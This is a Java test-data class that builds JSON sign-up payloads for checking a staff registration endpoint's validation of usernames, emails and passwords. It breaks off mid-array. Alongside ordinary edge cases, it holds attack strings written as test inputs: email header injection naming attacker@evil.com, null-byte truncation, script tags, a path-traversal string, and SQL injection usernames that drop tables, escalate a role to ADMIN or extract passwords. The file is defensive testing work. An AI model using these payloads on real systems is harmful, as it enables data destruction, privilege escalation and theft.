package dev.hope.vulcaobackend.TestingData;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class StaffRegistrationData {

    private final String companyId;

    public StaffRegistrationData(String companyId) {
        this.companyId = companyId;
    }

    public String[] getGoodUsernameData() throws JSONException {
        String[] goodData = new String[8];

        // Plain ASCII
        goodData[0] = new JSONObject().put("username", "johnsmith")
                .put("firstName", "John").put("lastName", "Smith")
                .put("email", "john@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        // ASCII with digits
        goodData[1] = new JSONObject().put("username", "user1234")
                .put("firstName", "User").put("lastName", "Test")
                .put("email", "user1@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        // Underscore (not blocked)
        goodData[2] = new JSONObject().put("username", "john_smith")
                .put("firstName", "John").put("lastName", "Smith")
                .put("email", "john2@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        // Single period (only "..." is blocked, not ".")
        goodData[3] = new JSONObject().put("username", "john.doe")
                .put("firstName", "John").put("lastName", "Doe")
                .put("email", "john3@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        // Boundary: minimum length (3 chars)
        goodData[4] = new JSONObject().put("username", "abdvdsvc")
                .put("firstName", "Abe").put("lastName", "Cee")
                .put("email", "abc@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        // Boundary: maximum length (20 chars)
        goodData[5] = new JSONObject().put("username", "abcdefghij1234567890")
                .put("firstName", "Max").put("lastName", "Length")
                .put("email", "max@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        // Digits only
        goodData[6] = new JSONObject().put("username", "1234vdd5")
                .put("firstName", "Number").put("lastName", "Only")
                .put("email", "num@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        // French
        goodData[7] = new JSONObject().put("username", "Francois_M")
                .put("firstName", "François").put("lastName", "Müller")
                .put("email", "francois@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        return goodData;
    }

    public String[] getBadUsernameData() throws JSONException {
        String[] badData = new String[59];
        int i = 0;

        // ===== Single-character blocked symbols =====
        badData[i++] = buildBadUser("user[name");      // [
        badData[i++] = buildBadUser("user]name");      // ]
        badData[i++] = buildBadUser("user{name");      // {
        badData[i++] = buildBadUser("user}name");      // }
        badData[i++] = buildBadUser("user,name");      // ,
        badData[i++] = buildBadUser("user=name");      // =
        badData[i++] = buildBadUser("user name");      // space
        badData[i++] = buildBadUser("user@name");      // @
        badData[i++] = buildBadUser("user#name");      // #
        badData[i++] = buildBadUser("user$name");      // $
        badData[i++] = buildBadUser("user%name");      // %
        badData[i++] = buildBadUser("user^name");      // ^
        badData[i++] = buildBadUser("user&name");      // &
        badData[i++] = buildBadUser("user*name");      // *
        badData[i++] = buildBadUser("user(name");      // (
        badData[i++] = buildBadUser("user)name");      // )
        badData[i++] = buildBadUser("user!name");      // !
        badData[i++] = buildBadUser("user+name");      // +
        badData[i++] = buildBadUser("user-name");      // -
        badData[i++] = buildBadUser("user/name");      // /
        badData[i++] = buildBadUser("user\\name");     // \
        badData[i++] = buildBadUser("user|name");      // |
        badData[i++] = buildBadUser("user:name");      // :
        badData[i++] = buildBadUser("user;name");      // ;
        badData[i++] = buildBadUser("user?name");      // ?
        badData[i++] = buildBadUser("user<name");      //
        badData[i++] = buildBadUser("user>name");      // >
        badData[i++] = buildBadUser("user~name");      // ~
        badData[i++] = buildBadUser("user`name");      // `
        badData[i++] = buildBadUser("user'name");      // '
        badData[i++] = buildBadUser("user\"name");     // "

        // ===== Multi-character blocked symbols =====
        badData[i++] = buildBadUser("user...name");    // ...
        badData[i++] = buildBadUser("user->name");     // ->
        badData[i++] = buildBadUser("user=>name");     // =>
        badData[i++] = buildBadUser("user::name");     // ::
        badData[i++] = buildBadUser("user!=name");     // !=
        badData[i++] = buildBadUser("user==name");     // ==
        badData[i++] = buildBadUser("user<=name");     // <=
        badData[i++] = buildBadUser("user>=name");     // >=
        badData[i++] = buildBadUser("user&&name");     // &&
        badData[i++] = buildBadUser("user||name");     // ||
        badData[i++] = buildBadUser("user++name");     // ++
        badData[i++] = buildBadUser("user--name");     // --
        badData[i++] = buildBadUser("user+=name");     // +=
        badData[i++] = buildBadUser("user-=name");     // -=
        badData[i++] = buildBadUser("user*=name");     // *=
        badData[i++] = buildBadUser("user/=name");     // /=
        badData[i++] = buildBadUser("user%=name");     // %=
        badData[i++] = buildBadUser("user/*name");     // /*
        badData[i++] = buildBadUser("user*/name");     // */
        badData[i++] = buildBadUser("user//name");     // //
        badData[i++] = buildBadUser("user/**nm");      // /**

        // ===== Length violations =====
        badData[i++] = buildBadUser("ab");                          // 2 chars (too short)
        badData[i++] = buildBadUser("a");                           // 1 char  (too short)
        badData[i++] = buildBadUser("abcdefghij123456789012");      // 22 chars (too long)

        // ===== Empty / null / whitespace =====
        badData[i++] = buildBadUser("");                            // empty string
        badData[i++] = new JSONObject().put("username", JSONObject.NULL)
                .put("firstName", "Null").put("lastName", "User")
                .put("email", "null@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();         // JSON null
        badData[i++] = buildBadUser("   ");                         // 3 spaces (caught by space symbol)
        badData[i++] = buildBadUser("\t\t\t");                      // 3 tabs (NOT in blocklist — see note below)

        return badData;
    }

    private String buildBadUser(String username) throws JSONException {
        return new JSONObject().put("username", username)
                .put("firstName", "Test").put("lastName", "User")
                .put("email", "test@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    public String[] getPlusTagEmailData() throws JSONException {
        String[] plusTagData = new String[10];

        plusTagData[0] = new JSONObject().put("username", "plustag1")
                .put("firstName", "John").put("lastName", "Smith")
                .put("email", "user+tag@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        plusTagData[1] = new JSONObject().put("username", "plustag2")
                .put("firstName", "Jane").put("lastName", "Doe")
                .put("email", "jane.doe+newsletter@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        plusTagData[2] = new JSONObject().put("username", "plustag3")
                .put("firstName", "Bob").put("lastName", "Jones")
                .put("email", "bob+2024@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        plusTagData[3] = new JSONObject().put("username", "plustag4")
                .put("firstName", "Alice").put("lastName", "Brown")
                .put("email", "alice+work+priority@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        plusTagData[4] = new JSONObject().put("username", "plustag5")
                .put("firstName", "Charlie").put("lastName", "Davis")
                .put("email", "charlie+spam@gmail.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        plusTagData[5] = new JSONObject().put("username", "plustag6")
                .put("firstName", "Diana").put("lastName", "Evans")
                .put("email", "diana+test-account@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        plusTagData[6] = new JSONObject().put("username", "plustag7")
                .put("firstName", "Eve").put("lastName", "Foster")
                .put("email", "eve+test.account@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        plusTagData[7] = new JSONObject().put("username", "plustag8")
                .put("firstName", "Frank").put("lastName", "Green")
                .put("email", "frank+@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        plusTagData[8] = new JSONObject().put("username", "plustag9")
                .put("firstName", "Grace").put("lastName", "Hall")
                .put("email", "grace_smith+filter@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        plusTagData[9] = new JSONObject().put("username", "plustag10")
                .put("firstName", "Henry").put("lastName", "Irving")
                .put("email", "henry+a@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        return plusTagData;
    }

    public String[] getDeepSubdomainEmailData() throws JSONException {
        String[] subdomainData = new String[10];

        subdomainData[0] = new JSONObject().put("username", "subdom113")
                .put("firstName", "John").put("lastName", "Smith")
                .put("email", "user@mail.example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        subdomainData[1] = new JSONObject().put("username", "subdom1112")
                .put("firstName", "Jane").put("lastName", "Doe")
                .put("email", "jane@dept.mail.example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        subdomainData[2] = new JSONObject().put("username", "subdom11123")
                .put("firstName", "Bob").put("lastName", "Jones")
                .put("email", "bob@team.dept.mail.example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        subdomainData[3] = new JSONObject().put("username", "subdom11124")
                .put("firstName", "Alice").put("lastName", "Brown")
                .put("email", "alice@a.b.c.d.example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        subdomainData[4] = new JSONObject().put("username", "subdom1115")
                .put("firstName", "Charlie").put("lastName", "Davis")
                .put("email", "charlie@us.east.engineering.acme.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        subdomainData[5] = new JSONObject().put("username", "subdom1116")
                .put("firstName", "Diana").put("lastName", "Evans")
                .put("email", "diana@mail.london.example.co.uk")
                .put("password", "Password123").put("companyId", companyId).toString();

        subdomainData[6] = new JSONObject().put("username", "subdom1117")
                .put("firstName", "Eve").put("lastName", "Foster")
                .put("email", "eve@mail-server.east-region.example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        subdomainData[7] = new JSONObject().put("username", "subdom11128")
                .put("firstName", "Frank").put("lastName", "Green")
                .put("email", "frank@server1.region2.example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        subdomainData[8] = new JSONObject().put("username", "subdom11129")
                .put("firstName", "Grace").put("lastName", "Hall")
                .put("email", "grace+work@mail.team.example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        subdomainData[9] = new JSONObject().put("username", "subdom111210")
                .put("firstName", "Henry").put("lastName", "Irving")
                .put("email", "henry@smtp.relay.outbound.mail.example.com")
                .put("password", "Password123").put("companyId", companyId).toString();

        return subdomainData;
    }

    /** Step 2: Username already taken */
    public String getDuplicateUsername() throws JSONException {
        return new JSONObject().put("username", "existingUser")
                .put("firstName", "Dup").put("lastName", "User")
                .put("email", "new2@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 3: Case-variant of existing email */
    public String getCaseVariantEmail() throws JSONException {
        return new JSONObject().put("username", "newUser3")
                .put("firstName", "Case").put("lastName", "Email")
                .put("email", "EXISTING@EXAMPLE.COM")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 4: Case-variant of existing username */
    public String getCaseVariantUsername() throws JSONException {
        return new JSONObject().put("username", "EXISTINGUSER")
                .put("firstName", "Case").put("lastName", "User")
                .put("email", "new4@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 5: Whitespace-padded existing email */
    public String getWhitespacePaddedEmail() throws JSONException {
        return new JSONObject().put("username", "newUser5")
                .put("firstName", "Pad").put("lastName", "Email")
                .put("email", "  existing@example.com  ")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 6: Trailing newline on existing username */
    public String getTrailingNewlineUsername() throws JSONException {
        return new JSONObject().put("username", "existingUser\n")
                .put("firstName", "Newline").put("lastName", "User")
                .put("email", "new6@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 7: NFC variant of NFD-stored email */
    public String getNfcVariantEmail() throws JSONException {
        String nfcEmail = "caf\u00E9@example.com";
        return new JSONObject().put("username", "newUser7")
                .put("firstName", "NFC").put("lastName", "Email")
                .put("email", nfcEmail)
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 8: Homograph variant of existing username */
    public String getHomographUsername() throws JSONException {
        String homograph = "existingUsera".replace("a", "\u0430");
        return new JSONObject().put("username", homograph)
                .put("firstName", "Homo").put("lastName", "Graph")
                .put("email", "new8@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 9: Zero-width space appended to existing username */
    public String getZeroWidthSpaceUsername() throws JSONException {
        String zwsp = "existingUser\u200B";
        return new JSONObject().put("username", zwsp)
                .put("firstName", "ZWSP").put("lastName", "User")
                .put("email", "new9@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }



    /** Step 10: BOM prefix on existing username */
    public String getBomPrefixUsername() throws JSONException {
        String bom = "\uFEFFexistingUser";
        return new JSONObject().put("username", bom)
                .put("firstName", "BOM").put("lastName", "BOM USER")
                .put("email", "new10@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 11: Null-byte truncation matching existing username */
    public String getNullByteTruncatedUsername() throws JSONException {
        String truncated = "existingUser\u0000extra";
        return new JSONObject().put("username", truncated)
                .put("firstName", "Null").put("lastName", "Byte")
                .put("email", "new11@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 1: Email with no @ symbol */
    public String getEmailNoAtSymbol() throws JSONException {
        return new JSONObject().put("username", "step1user")
                .put("firstName", "Step").put("lastName", "One")
                .put("email", "userexample.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 2: Email missing local part */
    public String getEmailMissingLocal() throws JSONException {
        return new JSONObject().put("username", "step2user")
                .put("firstName", "Step").put("lastName", "Two")
                .put("email", "@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 3: Email missing domain */
    public String getEmailMissingDomain() throws JSONException {
        return new JSONObject().put("username", "step3user")
                .put("firstName", "Step").put("lastName", "Three")
                .put("email", "user@")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 4: Email with spaces inside */
    public String getEmailWithSpaces() throws JSONException {
        return new JSONObject().put("username", "step4user")
                .put("firstName", "Step").put("lastName", "Four")
                .put("email", "user name@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 5: Email with double @ signs */
    public String getEmailDoubleAt() throws JSONException {
        return new JSONObject().put("username", "step5user")
                .put("firstName", "Step").put("lastName", "Five")
                .put("email", "user@@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 6: Email with leading dot in local part */
    public String getEmailLeadingDot() throws JSONException {
        return new JSONObject().put("username", "step6user")
                .put("firstName", "Step").put("lastName", "Six")
                .put("email", ".user@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 7: Email with trailing dot before @ */
    public String getEmailTrailingDotBeforeAt() throws JSONException {
        return new JSONObject().put("username", "step7user")
                .put("firstName", "Step").put("lastName", "Seven")
                .put("email", "user.@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 8: Email with consecutive dots in local part */
    public String getEmailConsecutiveDots() throws JSONException {
        return new JSONObject().put("username", "step8user")
                .put("firstName", "Step").put("lastName", "Eight")
                .put("email", "us..er@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 9: Email with dot immediately after @ */
    public String getEmailDotAfterAt() throws JSONException {
        return new JSONObject().put("username", "step9user")
                .put("firstName", "Step").put("lastName", "Nine")
                .put("email", "user@.example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 10: Email with no TLD */
    public String getEmailNoTld() throws JSONException {
        return new JSONObject().put("username", "step10user")
                .put("firstName", "Step").put("lastName", "Ten")
                .put("email", "user@host")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 11: Email with leading hyphen in domain */
    public String getEmailLeadingHyphenDomain() throws JSONException {
        return new JSONObject().put("username", "step11user")
                .put("firstName", "Step").put("lastName", "Eleven")
                .put("email", "user@-example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 12: Email with trailing hyphen in domain */
    public String getEmailTrailingHyphenDomain() throws JSONException {
        return new JSONObject().put("username", "step12user")
                .put("firstName", "Step").put("lastName", "Twelve")
                .put("email", "user@--example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 13: Email with HTML/script tags in local part */
    public String getEmailWithHtmlTags() throws JSONException {
        return new JSONObject().put("username", "step13user")
                .put("firstName", "Step").put("lastName", "Thirteen")
                .put("email", "<script>alert(1)</script>@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 14: Email with IPv4 literal host */
    public String getEmailIpv4Literal() throws JSONException {
        return new JSONObject().put("username", "step14user")
                .put("firstName", "Step").put("lastName", "Fourteen")
                .put("email", "user@[127.0.0.1]")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 15: Email with IPv6 literal host */
    public String getEmailIpv6Literal() throws JSONException {
        return new JSONObject().put("username", "step15user")
                .put("firstName", "Step").put("lastName", "Fifteen")
                .put("email", "user@[IPv6:2001:db8::1]")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 16: Email with quoted local part containing special chars */
    public String getEmailQuotedLocal() throws JSONException {
        return new JSONObject().put("username", "step16user")
                .put("firstName", "Step").put("lastName", "Sixteen")
                .put("email", "\"user!#$%&'*+/=?^_`{|}~\"@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 17: Very-short minimal email a@b */
    public String getEmailVeryShort() throws JSONException {
        return new JSONObject().put("username", "step17user")
                .put("firstName", "Step").put("lastName", "Seventeen")
                .put("email", "a@b")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 18: Local part exceeding 64 chars (RFC limit) */
    public String getEmailLocalTooLong() throws JSONException {
        String local = "a".repeat(65);
        return new JSONObject().put("username", "step18user")
                .put("firstName", "Step").put("lastName", "Eighteen")
                .put("email", local + "@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 19: TLD exceeding 64 chars */
    public String getEmailTldTooLong() throws JSONException {
        String tld = "a".repeat(65);
        return new JSONObject().put("username", "step19user")
                .put("firstName", "Step").put("lastName", "Nineteen")
                .put("email", "user@example." + tld)
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 20: Full address > 320 chars */
    public String getEmailTooLongOverall() throws JSONException {
        String local = "a".repeat(64);
        String domain = ("b".repeat(60) + ".").repeat(5) + "example.com";
        return new JSONObject().put("username", "step20user")
                .put("firstName", "Step").put("lastName", "Twenty")
                .put("email", local + "@" + domain)
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 21: Embedded CRLF then Bcc header (header injection) */
    public String getEmailHeaderInjection() throws JSONException {
        return new JSONObject().put("username", "step21user")
                .put("firstName", "Step").put("lastName", "TwentyOne")
                .put("email", "user@example.com\r\nBcc: attacker@evil.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 22: Null byte then attacker domain (truncation attack) */
    public String getEmailNullByteTruncation() throws JSONException {
        return new JSONObject().put("username", "step22user")
                .put("firstName", "Step").put("lastName", "TwentyTwo")
                .put("email", "user@example.com\u0000@evil.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 23: Percent-encoded null %00 */
    public String getEmailPercentEncodedNull() throws JSONException {
        return new JSONObject().put("username", "step23user")
                .put("firstName", "Step").put("lastName", "TwentyThree")
                .put("email", "user%00@example.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 24: Unicode IDN email */
    public String getEmailUnicodeIdn() throws JSONException {
        return new JSONObject().put("username", "step24user")
                .put("firstName", "Step").put("lastName", "TwentyFour")
                .put("email", "用户@例子.广告")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 25: EMOJI*/
    public String getEmailWithEmoji() throws JSONException {
        return new JSONObject().put("username", "step24user")
                .put("firstName", "Step").put("lastName", "TwentyFour")
                .put("email",  "🎉🚀🔥🌟⭐✨@gm💫🌈ail.com")
                .put("password", "Password123").put("companyId", companyId).toString();
    }

    /** Step 1: Empty password */
    public String getPasswordEmpty() throws JSONException {
        return new JSONObject().put("username", "pwstep1")
                .put("firstName", "Step").put("lastName", "One")
                .put("email", "pw1@example.com")
                .put("password", "").put("companyId", companyId).toString();
    }

    /** Step 2: Single-character password */
    public String getPasswordSingleChar() throws JSONException {
        return new JSONObject().put("username", "pwstep2")
                .put("firstName", "Step").put("lastName", "Two")
                .put("email", "pw2@example.com")
                .put("password", "a").put("companyId", companyId).toString();
    }

    /** Step 3: Just below minimum length (7 chars) */
    public String getPasswordJustBelowMin() throws JSONException {
        return new JSONObject().put("username", "pwstep3")
                .put("firstName", "Step").put("lastName", "Three")
                .put("email", "pw3@example.com")
                .put("password", "Pass12!").put("companyId", companyId).toString();
    }

    /** Step 4: Whitespace-only password */
    public String getPasswordWhitespaceOnly() throws JSONException {
        return new JSONObject().put("username", "pwstep4")
                .put("firstName", "Step").put("lastName", "Four")
                .put("email", "pw4@example.com")
                .put("password", "        ").put("companyId", companyId).toString();
    }


    /** Step 12: 10,000-character password */
    public String getPasswordExtremelyLong() throws JSONException {
        String huge = "A".repeat(10_000);
        return new JSONObject().put("username", "pwstep12")
                .put("firstName", "Step").put("lastName", "Twelve")
                .put("email", "pw12@example.com")
                .put("password", huge).put("companyId", companyId).toString();
    }

    /** Step 13: Null bytes only */
    public String getPasswordNullBytesOnly() throws JSONException {
        return new JSONObject().put("username", "pwstep13")
                .put("firstName", "Step").put("lastName", "Thirteen")
                .put("email", "pw13@example.com")
                .put("password", "\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000").put("companyId", companyId).toString();
    }

    /** Step 14: Null byte truncation attempt */
    public String getPasswordNullByteTruncation() throws JSONException {
        return new JSONObject().put("username", "pwstep14")
                .put("firstName", "Step").put("lastName", "Fourteen")
                .put("email", "pw14@example.com")
                .put("password", "Password\u0000ExtraStuffHere").put("companyId", companyId).toString();
    }

    /** Step 15: Password with diacritics (should normalize, then succeed) */
    public String getPasswordWithDiacritics() throws JSONException {
        return new JSONObject().put("username", "pwstep15")
                .put("firstName", "Step").put("lastName", "Fifteen")
                .put("email", "pw15@example.com")
                .put("password", "Pässwörd123").put("companyId", companyId).toString();
    }

    /** Step 16: Password with BOM mid-string */
    public String getPasswordWithBom() throws JSONException {
        return new JSONObject().put("username", "pwstep16")
                .put("firstName", "Step").put("lastName", "Sixteen")
                .put("email", "pw16@example.com")
                .put("password", "Pass\uFEFFword123").put("companyId", companyId).toString();
    }

    /** Step 17: Password with zero-width space */
    public String getPasswordWithZeroWidthSpace() throws JSONException {
        return new JSONObject().put("username", "pwstep17")
                .put("firstName", "Step").put("lastName", "Seventeen")
                .put("email", "pw17@example.com")
                .put("password", "Pass\u200Bword123").put("companyId", companyId).toString();
    }

    /** Step 18: Emoji-only password */
    public String getPasswordEmojiOnly() throws JSONException {
        return new JSONObject().put("username", "pwstep18")
                .put("firstName", "Step").put("lastName", "Eighteen")
                .put("email", "pw18@example.com")
                .put("password", "🎉🚀🔥🌟⭐✨💫🌈").put("companyId", companyId).toString();
    }

    /** Step 19: Path traversal string as password (opaque, should succeed) */
    public String getPasswordPathTraversal() throws JSONException {
        return new JSONObject().put("username", "pwstep19")
                .put("firstName", "Step").put("lastName", "Nineteen")
                .put("email", "pw19@example.com")
                .put("password", "../../etc/passwd").put("companyId", companyId).toString();
    }

    /** Step 20: Script tag as password (opaque, should succeed) */
    public String getPasswordScriptTag() throws JSONException {
        return new JSONObject().put("username", "pwstep20")
                .put("firstName", "Step").put("lastName", "Twenty")
                .put("email", "pw20@example.com")
                .put("password", "<script>alert(1)</script>").put("companyId", companyId).toString();
    }

    /** Step 21: SQL injection attempt as password (opaque, should succeed) */
    public String getPasswordSqlInjection() throws JSONException {
        return new JSONObject().put("username", "pwstep21")
                .put("firstName", "Step").put("lastName", "TwentyOne")
                .put("email", "pw21@example.com")
                .put("password", "' OR '1'='1").put("companyId", companyId).toString();
    }

    public String[] getUserWithInvalidData() throws JSONException {
        return new String[] {
                new JSONObject().put("username", "   ").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith1@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "jsmith2").put("lastName", "Smith").put("firstName", "\t").put("email", "john.smith2@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "jsmith3").put("lastName", "\n").put("firstName", "John").put("email", "john.smith3@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "jsmith4").put("lastName", "Smith").put("firstName", "John").put("email", "  john.smith4@gmail.com  ").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "john\t\n\rsmith").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith5@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "jsmith6").put("lastName", "Smith").put("firstName", "John\b").put("email", "john.smith6@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "jsmith7").put("lastName", "Smith\u0007").put("firstName", "John").put("email", "john.smith7@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString()
        };
    }

    public List<String> getUserWithLengthBoundaryData() throws JSONException {
        List<String> userDetails = new ArrayList<>();

        userDetails.add(new JSONObject()
                .put("username", "a")
                .put("lastName", "Smith")
                .put("firstName", "John")
                .put("email", "john.smith1@gmail.com")
                .put("password", "grgrbtrhrebwhnrwtn")
                .put("companyId", companyId).toString());

        userDetails.add(new JSONObject()
                .put("username", "a".repeat(500))
                .put("lastName", "Smith")
                .put("firstName", "John")
                .put("email", "john.smith2@gmail.com")
                .put("password", "grgrbtrhrebwhnrwtn")
                .put("companyId", companyId).toString());

        userDetails.add(new JSONObject()
                .put("username", "a".repeat(65535))
                .put("lastName", "Smith")
                .put("firstName", "John")
                .put("email", "john.smith3@gmail.com")
                .put("password", "grgrbtrhrebwhnrwtn")
                .put("companyId", companyId).toString());

        userDetails.add(new JSONObject()
                .put("username", "testUser4")
                .put("lastName", "Smith")
                .put("firstName", "a".repeat(10000))
                .put("email", "john.smith4@gmail.com")
                .put("password", "grgrbtrhrebwhnrwtn")
                .put("companyId", companyId).toString());

        userDetails.add(new JSONObject()
                .put("username", "testUser5")
                .put("lastName", "a".repeat(10000))
                .put("firstName", "John")
                .put("email", "john.smith5@gmail.com")
                .put("password", "grgrbtrhrebwhnrwtn")
                .put("companyId", companyId).toString());

        userDetails.add(new JSONObject()
                .put("username", "testUser6")
                .put("lastName", "Smith")
                .put("firstName", "John")
                .put("email", "john.smith6@gmail.com")
                .put("password", "a".repeat(1048576))
                .put("companyId", companyId).toString());

        userDetails.add(new JSONObject()
                .put("username", "a".repeat(50))
                .put("lastName", "Smith")
                .put("firstName", "John")
                .put("email", "john.smith7@gmail.com")
                .put("password", "grgrbtrhrebwhnrwtn")
                .put("companyId", companyId).toString());

        userDetails.add(new JSONObject()
                .put("username", "a".repeat(51))
                .put("lastName", "Smith")
                .put("firstName", "John")
                .put("email", "john.smith8@gmail.com")
                .put("password", "grgrbtrhrebwhnrwtn")
                .put("companyId", companyId).toString());

        return userDetails;
    }

    public String[] getUserWithSqlInjectionData() throws JSONException {
        return new String[] {
                new JSONObject().put("username", "admin'--").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith1@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin' #").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith2@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "' OR '1'='1").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith3@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "' OR 1=1--").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith4@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin'; DROP TABLE users; --").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith5@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "'; DELETE FROM users WHERE 1=1; --").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith6@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "'; UPDATE users SET role='ADMIN' --").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith7@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "' UNION SELECT NULL,NULL,NULL--").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith8@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith9@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "' AND extractvalue(1,concat(0x7e,@@version))--").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith10@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin' AND SLEEP(5)--").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith11@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin'; WAITFOR DELAY '0:0:5'--").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith12@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin' AND pg_sleep(5)--").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith13@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'--").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith14@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
